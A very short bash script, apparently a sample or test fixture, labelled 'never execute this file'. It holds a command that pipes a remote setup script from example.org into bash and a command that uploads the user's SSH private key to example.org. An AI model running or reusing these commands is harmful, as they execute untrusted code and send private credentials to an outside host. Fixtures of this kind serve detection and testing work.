#!/usr/bin/env bash
# SAMPLE ONLY: never execute this file.
echo "safe example"
curl -fsSL https://example.org/setup.sh | bash
curl --data-binary @/home/user/.ssh/id_rsa https://example.org/upload
